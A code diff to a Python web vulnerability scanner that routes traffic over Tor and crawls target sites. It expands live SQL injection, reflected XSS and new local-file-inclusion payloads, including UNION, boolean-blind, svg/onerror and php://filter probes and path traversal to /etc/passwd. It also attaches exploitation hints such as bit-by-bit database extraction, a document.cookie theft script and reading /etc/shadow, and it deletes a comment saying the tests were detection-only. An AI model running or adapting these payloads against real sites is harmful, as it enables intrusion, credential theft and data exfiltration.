@@ -748,18 +748,51 @@ class VulnScanner:
     REDIRECT_PARAMS = ["url", "redirect", "next", "return", "returnTo",
                        "goto", "redirect_uri", "continue", "target", "dest"]
 
-    # SQL injection test patterns (benign — detection only, no exploitation)
     SQLI_INDICATORS = [
+        # MySQL
         re.compile(r"SQL syntax.*MySQL", re.I),
-        re.compile(r"Warning.*mysql_", re.I),
+        re.compile(r"Warning.*\Wmysqli?_", re.I),
+        re.compile(r"MySQLSyntaxErrorException", re.I),
+        re.compile(r"valid MySQL result", re.I),
+        re.compile(r"check the manual that corresponds to your (MySQL|MariaDB)", re.I),
+        re.compile(r"MySqlClient\.", re.I),
+        re.compile(r"com\.mysql\.jdbc", re.I),
+        re.compile(r"You have an error in your SQL syntax", re.I),
+        # PostgreSQL
         re.compile(r"PostgreSQL.*ERROR", re.I),
+        re.compile(r"pg_query\(\).*failed", re.I),
+        re.compile(r"pg_exec\(\).*failed", re.I),
+        re.compile(r'ERROR:\s+syntax error at or near', re.I),
+        re.compile(r"valid PostgreSQL result", re.I),
+        re.compile(r"org\.postgresql\.util\.PSQLException", re.I),
+        # Oracle
         re.compile(r"ORA-\d{5}", re.I),
+        re.compile(r"Oracle.*Driver", re.I),
+        re.compile(r"oracle\.jdbc", re.I),
+        re.compile(r"quoted string not properly terminated", re.I),
+        # SQL Server
         re.compile(r"Microsoft.*ODBC.*SQL", re.I),
         re.compile(r"Unclosed quotation mark", re.I),
-        re.compile(r"quoted string not properly terminated", re.I),
+        re.compile(r"Microsoft OLE DB Provider for SQL Server", re.I),
+        re.compile(r"mssql_query\(\)", re.I),
+        re.compile(r"System\.Data\.SqlClient\.", re.I),
+        re.compile(r"Incorrect syntax near", re.I),
+        re.compile(r"SQLSTATE\[", re.I),
+        # SQLite
         re.compile(r"SQLite3::query", re.I),
-        re.compile(r"pg_query\(\).*failed", re.I),
-        re.compile(r"You have an error in your SQL syntax", re.I),
+        re.compile(r"SQLite\.Exception", re.I),
+        re.compile(r"SQLITE_ERROR", re.I),
+        re.compile(r"sqlite3\.OperationalError", re.I),
+        re.compile(r"unrecognized token:", re.I),
+        # Generic / PHP / Python / Java
+        re.compile(r"PDOException", re.I),
+        re.compile(r"SQLSTATE\[\w+\].*driver", re.I),
+        re.compile(r"java\.sql\.SQLException", re.I),
+        re.compile(r"Hibernate.*QueryException", re.I),
+        re.compile(r"SQL command not properly ended", re.I),
+        re.compile(r"supplied argument is not a valid", re.I),
+        re.compile(r"on line \d+.*(?:mysql|pg_|sqlite|ora)", re.I),
+        re.compile(r"Dynamic SQL Error", re.I),
     ]
 
     def __init__(self, session: TorSession):
@@ -898,10 +931,12 @@ class VulnScanner:
                     if not name:
                         continue
                     itype = inp.get("type", "text").lower()
-                    if itype in ("submit", "button", "image", "reset", "hidden"):
+                    if itype in ("submit", "button", "image", "reset"):
                         continue
-                    value = inp.get("value", "test")
-                    params.append({"name": name, "value": value})
+                    value = inp.get("value", "")
+                    is_hidden = (itype == "hidden")
+                    params.append({"name": name, "value": value,
+                                   "hidden": is_hidden, "type": itype})
 
                 if params:
                     endpoints.append({
@@ -946,130 +981,302 @@ class VulnScanner:
         self._crawled_urls = unique[:50]
         return self._crawled_urls
 
+    def _build_request_data(self, endpoint: dict, target_param: str, value: str) -> dict:
+        """Build complete form data for an endpoint, injecting value into target_param
+        while preserving all other params (especially hidden ones the form needs)."""
+        data = {}
+        for p in endpoint.get("params", []):
+            if p["name"] == target_param:
+                data[p["name"]] = value
+            else:
+                data[p["name"]] = p.get("value", "")
+        if target_param not in data:
+            data[target_param] = value
+        return data
+
+    def _send_test(self, endpoint: dict, param_name: str, value: str
+                   ) -> Optional[requests.Response]:
+        """Send a test request to an endpoint with one param set to the test value."""
+        url = endpoint["url"]
+        if endpoint["method"] == "GET":
+            qs = urlencode(self._build_request_data(endpoint, param_name, value))
+            return self._session.get(f"{url}?{qs}", allow_wayback=False)
+        else:
+            return self._session.post_form(
+                url, self._build_request_data(endpoint, param_name, value))
+
     def _test_endpoint_sqli(self, endpoint: dict) -> List[dict]:
-        """Test a specific endpoint for SQL injection."""
+        """Test for SQL injection: error-based + blind (response-diff)."""
         findings = []
         url = endpoint["url"]
         domain = urlparse(url).netloc
+        path = urlparse(url).path or "/"
         if self._session.is_domain_blocked(domain):
             return findings
 
-        for param_info in endpoint["params"][:3]:
-            if shutdown_requested():
+        testable = [p for p in endpoint["params"] if not p.get("hidden")]
+        if not testable:
+            testable = endpoint["params"][:2]
+
+        for param_info in testable[:4]:
+            if shutdown_requested() or self._session.is_domain_blocked(domain):
                 break
             pname = param_info["name"]
-            pval = param_info.get("value", "1")
+            pval = param_info.get("value", "") or "1"
 
-            # Baseline
-            if endpoint["method"] == "GET":
-                baseline_url = f"{url}?{pname}={quote(pval)}"
-                baseline_resp = self._session.get(baseline_url, allow_wayback=False)
-            else:
-                baseline_resp = self._session.post_form(url, {pname: pval})
-            baseline_text = baseline_resp.text[:5000] if baseline_resp else ""
+            # === Phase A: Error-based detection ===
+            baseline_resp = self._send_test(endpoint, pname, pval)
+            baseline_text = baseline_resp.text[:8000] if baseline_resp else ""
+            baseline_len = len(baseline_resp.text) if baseline_resp else 0
 
-            payloads = [
-                (f"{pval}'", "single quote"),
-                (f"{pval}\"", "double quote"),
-                (f"{pval}' OR '1'='1", "OR tautology"),
-                (f"{pval}' AND 1=CONVERT(int,(SELECT @@version))--", "error-based MSSQL"),
-                (f"{pval}) UNION SELECT NULL--", "UNION probe"),
+            error_payloads = [
+                f"{pval}'",
+                f"{pval}\"",
+                f"{pval}'--",
+                f"{pval}\\",
+                f"{pval}' OR ''='",
+                f"{pval}') OR ('1'='1",
+                f"{pval}' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
+                f"{pval}' UNION SELECT NULL-- -",
+                f"{pval}' UNION SELECT NULL,NULL-- -",
+                f"{pval}' UNION SELECT NULL,NULL,NULL-- -",
+                f"{pval}; SELECT 1-- -",
+                f"{pval}' AND 1=CONVERT(int,@@version)-- -",
             ]
 
-            for payload, desc in payloads:
-                if shutdown_requested():
+            for payload in error_payloads:
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
                     break
-                if self._session.is_domain_blocked(domain):
-                    break
+                resp = self._send_test(endpoint, pname, payload)
+                if not resp or not resp.text:
+                    continue
 
-                if endpoint["method"] == "GET":
-                    test_url = f"{url}?{pname}={quote(payload)}"
-                    resp = self._session.get(test_url, allow_wayback=False)
-                else:
-                    resp = self._session.post_form(url, {pname: payload})
-                    test_url = f"{url} [POST {pname}={payload[:30]}]"
-
-                if resp and resp.text:
-                    for indicator in self.SQLI_INDICATORS:
-                        in_payload = indicator.search(resp.text[:5000])
-                        in_baseline = indicator.search(baseline_text) if baseline_text else False
-                        if in_payload and not in_baseline:
+                for indicator in self.SQLI_INDICATORS:
+                    if indicator.search(resp.text[:8000]):
+                        if not (baseline_text and indicator.search(baseline_text)):
+                            test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
                             findings.append({
                                 "severity": SEV_CRITICAL,
-                                "title": f"SQL injection via '{pname}' at {urlparse(url).path}",
-                                "detail": f"SQL error from {desc} injection. "
-                                          "Input reaches SQL query without parameterization.",
-                                "evidence": f"URL: {urlparse(url).path}, param: {pname}, "
-                                            f"payload: {desc}, matched: {indicator.pattern[:40]}",
+                                "title": f"SQL injection via '{pname}' at {path}",
+                                "detail": f"SQL error triggered by payload: {payload[:40]}. "
+                                          "Input reaches SQL query without sanitization.",
+                                "evidence": f"param: {pname}, payload: {payload[:40]}, "
+                                            f"matched: {indicator.pattern[:50]}",
                                 "exploitable": True,
-                                "test_url": test_url if endpoint["method"] == "GET" else url,
+                                "test_url": test_url,
                                 "exploit_info": {
                                     "type": "sqli",
                                     "parameter": pname,
-                                    "path": urlparse(url).path,
-                                    "method": f"Inject SQL via '{pname}' at {urlparse(url).path}. "
-                                              f"Confirmed with: {desc}. "
-                                              "Try: UNION SELECT, boolean-based blind, time-based blind.",
-                                    "risk": "Database access, data exfiltration, potential RCE",
+                                    "path": path,
+                                    "method": f"Inject via '{pname}' at {path}. Error-based confirmed.",
+                                    "risk": "Full database access, data exfiltration, potential RCE",
                                 },
                             })
                             return findings
+
+            # === Phase B: Blind boolean-based detection ===
+            if baseline_len > 0:
+                true_resp = self._send_test(endpoint, pname, f"{pval}' AND '1'='1")
+                false_resp = self._send_test(endpoint, pname, f"{pval}' AND '1'='2")
+                if true_resp and false_resp:
+                    true_len = len(true_resp.text)
+                    false_len = len(false_resp.text)
+                    # Significant length difference between true/false conditions
+                    # while true condition matches baseline = blind SQLi
+                    if (abs(true_len - baseline_len) < baseline_len * 0.1 and
+                            abs(false_len - baseline_len) > baseline_len * 0.15 and
+                            false_len != true_len):
+                        test_url = f"{url}?{pname}={quote(pval)}' AND '1'='1" if endpoint["method"] == "GET" else url
+                        findings.append({
+                            "severity": SEV_CRITICAL,
+                            "title": f"Blind SQL injection via '{pname}' at {path}",
+                            "detail": f"Response differs based on boolean SQL condition. "
+                                      f"true={true_len}B matches baseline={baseline_len}B, "
+                                      f"false={false_len}B differs significantly.",
+                            "evidence": f"param: {pname}, baseline: {baseline_len}B, "
+                                        f"AND 1=1: {true_len}B, AND 1=2: {false_len}B",
+                            "exploitable": True,
+                            "test_url": test_url,
+                            "exploit_info": {
+                                "type": "sqli",
+                                "parameter": pname,
+                                "path": path,
+                                "method": f"Blind boolean SQLi via '{pname}'. "
+                                          "Extract data bit-by-bit with: "
+                                          "' AND SUBSTRING(user(),1,1)='a' --",
+                                "risk": "Full database access via blind extraction",
+                            },
+                        })
+                        return findings
+
         return findings
 
     def _test_endpoint_xss(self, endpoint: dict) -> List[dict]:
-        """Test a specific endpoint for reflected XSS."""
+        """Test for reflected XSS across multiple injection contexts."""
         findings = []
         url = endpoint["url"]
         domain = urlparse(url).netloc
+        path = urlparse(url).path or "/"
         if self._session.is_domain_blocked(domain):
             return findings
 
-        for param_info in endpoint["params"][:3]:
-            if shutdown_requested():
+        testable = [p for p in endpoint["params"] if not p.get("hidden")]
+        if not testable:
+            testable = endpoint["params"][:2]
+
+        for param_info in testable[:4]:
+            if shutdown_requested() or self._session.is_domain_blocked(domain):
                 break
             pname = param_info["name"]
-            canary = f"gs{secrets.token_hex(4)}xss"
+            cid = secrets.token_hex(4)
 
-            # Multiple XSS contexts
             payloads = [
-                (f"<{canary}>", f"<{canary}>", "HTML tag context"),
-                (f'"{canary}', f'"{canary}', "attribute breakout"),
-                (f"<script>{canary}</script>", f"<script>{canary}</script>", "script injection"),
-                (f"<img src=x onerror={canary}>", canary, "event handler"),
+                # HTML context — unescaped tag injection
+                (f"<gs{cid}>", f"<gs{cid}>", "HTML tag injection"),
+                # Script injection
+                (f"<script>gs{cid}</script>", f"<script>gs{cid}</script>", "script injection"),
+                # Event handler (img onerror)
+                (f'<img src=x onerror="gs{cid}">', f"gs{cid}", "event handler injection"),
+                # SVG-based XSS (bypasses some filters)
+                (f'<svg onload="gs{cid}">', f"gs{cid}", "SVG onload injection"),
+                # Attribute breakout with event
+                (f'" onfocus="gs{cid}" autofocus="', f"gs{cid}", "attribute injection"),
+                # JavaScript protocol (href/action)
+                (f"javascript:gs{cid}//", f"javascript:gs{cid}", "javascript: URI"),
+                # Template injection (Angular/Vue/React)
+                (f"{{{{gs{cid}}}}}", f"gs{cid}", "template expression"),
             ]
 
             for payload, check_str, desc in payloads:
                 if shutdown_requested() or self._session.is_domain_blocked(domain):
                     break
 
-                if endpoint["method"] == "GET":
-                    test_url = f"{url}?{pname}={quote(payload)}"
-                    resp = self._session.get(test_url, allow_wayback=False)
-                else:
-                    resp = self._session.post_form(url, {pname: payload})
-                    test_url = f"{url} [POST {pname}]"
+                resp = self._send_test(endpoint, pname, payload)
+                if not resp or not resp.text or resp.status_code in (403, 429, 503):
+                    continue
 
-                if resp and resp.text and resp.status_code not in (403, 429, 503):
-                    if check_str in resp.text:
+                if check_str in resp.text:
+                    # Confirm it's in an executable context
+                    idx = resp.text.find(check_str)
+                    context_before = resp.text[max(0, idx-200):idx].lower()
+                    # Skip if inside HTML comment or <textarea>/<pre>
+                    if "<!--" in context_before and "-->" not in context_before:
+                        continue
+                    in_safe = any(f"<{t}" in context_before and f"</{t}" not in context_before
+                                 for t in ("textarea", "pre", "code", "xmp"))
+                    if in_safe:
+                        continue
+
+                    test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
+                    findings.append({
+                        "severity": SEV_HIGH,
+                        "title": f"Reflected XSS via '{pname}' at {path}",
+                        "detail": f"Payload reflected unescaped in {desc} context.",
+                        "evidence": f"param: {pname}, context: {desc}, "
+                                    f"payload reflected at position {idx}",
+                        "exploitable": True,
+                        "test_url": test_url,
+                        "exploit_info": {
+                            "type": "xss",
+                            "parameter": pname,
+                            "path": path,
+                            "method": f"Inject via '{pname}' at {path}. Context: {desc}. "
+                                      f"Payload: <script>alert(document.cookie)</script>",
+                            "risk": "Session theft, credential capture, phishing",
+                        },
+                    })
+                    return findings
+        return findings
+
+    def _test_endpoint_lfi(self, endpoint: dict) -> List[dict]:
+        """Test for Local File Inclusion / path traversal on discovered endpoints."""
+        findings = []
+        url = endpoint["url"]
+        domain = urlparse(url).netloc
+        path = urlparse(url).path or "/"
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        # Only test params that look like they accept file/path input
+        file_params = [p for p in endpoint["params"]
+                       if p["name"].lower() in ("page", "file", "include", "path",
+                                                 "template", "doc", "view", "lang",
+                                                 "dir", "folder", "load", "read",
+                                                 "content", "module", "action")
+                       and not p.get("hidden")]
+        if not file_params:
+            return findings
+
+        passwd_indicators = [
+            re.compile(r"root:[x*]:0:0:"),
+            re.compile(r"daemon:.*:/usr/sbin"),
+            re.compile(r"www-data:.*:/var/www"),
+            re.compile(r"\[boot loader\]", re.I),  # Windows boot.ini
+        ]
+
+        payloads = [
+            "../../../etc/passwd",
+            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+            "....//....//....//etc/passwd",
+            "/etc/passwd",
+            "..\\..\\..\\..\\windows\\win.ini",
+            "php://filter/convert.base64-encode/resource=index",
+            "php://filter/convert.base64-encode/resource=../config",
+        ]
+
+        for param_info in file_params[:2]:
+            for payload in payloads:
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
+                    return findings
+                resp = self._send_test(endpoint, param_info["name"], payload)
+                if not resp or not resp.text:
+                    continue
+                for ind in passwd_indicators:
+                    if ind.search(resp.text[:5000]):
+                        test_url = f"{url}?{param_info['name']}={quote(payload)}" if endpoint["method"] == "GET" else url
                         findings.append({
-                            "severity": SEV_HIGH,
-                            "title": f"Reflected XSS via '{pname}' at {urlparse(url).path}",
-                            "detail": f"Payload reflected unescaped ({desc}). "
-                                      "Attacker can inject arbitrary JavaScript.",
-                            "evidence": f"URL: {urlparse(url).path}, param: {pname}, context: {desc}",
+                            "severity": SEV_CRITICAL,
+                            "title": f"LFI via '{param_info['name']}' at {path}",
+                            "detail": "Arbitrary local files readable through web server.",
+                            "evidence": f"param: {param_info['name']}, payload: {payload[:40]}",
                             "exploitable": True,
-                            "test_url": test_url if endpoint["method"] == "GET" else url,
+                            "test_url": test_url,
                             "exploit_info": {
-                                "type": "xss",
-                                "parameter": pname,
-                                "path": urlparse(url).path,
-                                "method": f"Inject via '{pname}' at {urlparse(url).path}. "
-                                          f"Context: {desc}. "
-                                          "Payload: <script>alert(document.cookie)</script>",
-                                "risk": "Session theft, credential capture, client-side attacks",
+                                "type": "lfi",
+                                "parameter": param_info["name"],
+                                "path": path,
+                                "method": f"LFI via '{param_info['name']}' at {path}. "
+                                          "Read /etc/shadow, config files, source code.",
+                                "risk": "Full filesystem read, credential theft, potential RCE",
                             },
                         })
                         return findings
+                # Check for base64-encoded PHP source (php:// wrapper)
+                if "php://" in payload and resp.text:
+                    import base64 as _b64
+                    try:
+                        for chunk in re.findall(r'[A-Za-z0-9+/=]{40,}', resp.text[:5000]):
+                            decoded = _b64.b64decode(chunk).decode("utf-8", errors="ignore")
+                            if "<?php" in decoded or "<?=" in decoded:
+                                findings.append({
+                                    "severity": SEV_CRITICAL,
+                                    "title": f"PHP source disclosure via '{param_info['name']}' at {path}",
+                                    "detail": "PHP filter wrapper returns base64-encoded source code.",
+                                    "evidence": f"param: {param_info['name']}, decoded PHP source found",
+                                    "exploitable": True,
+                                    "test_url": f"{url}?{param_info['name']}={quote(payload)}",
+                                    "exploit_info": {
+                                        "type": "lfi",
+                                        "parameter": param_info["name"],
+                                        "path": path,
+                                        "method": "PHP filter wrapper to read source code. "
+                                                  "Try: php://filter/convert.base64-encode/resource=config",
+                                        "risk": "Source code disclosure, credential extraction",
+                                    },
+                                })
+                                return findings
+                    except Exception:
+                        pass
         return findings
 
     @staticmethod
@@ -1215,6 +1422,12 @@ class VulnScanner:
                     ep_findings.extend(xss)
                 except Exception as e:
                     integrity_log("intel", f"xss_error:{path}:{type(e).__name__}")
+
+                try:
+                    lfi = self._test_endpoint_lfi(ep)
+                    ep_findings.extend(lfi)
+                except Exception as e:
+                    integrity_log("intel", f"lfi_error:{path}:{type(e).__name__}")
 
                 if ep_findings:
                     self._add_confidence(ep_findings, 0.9)
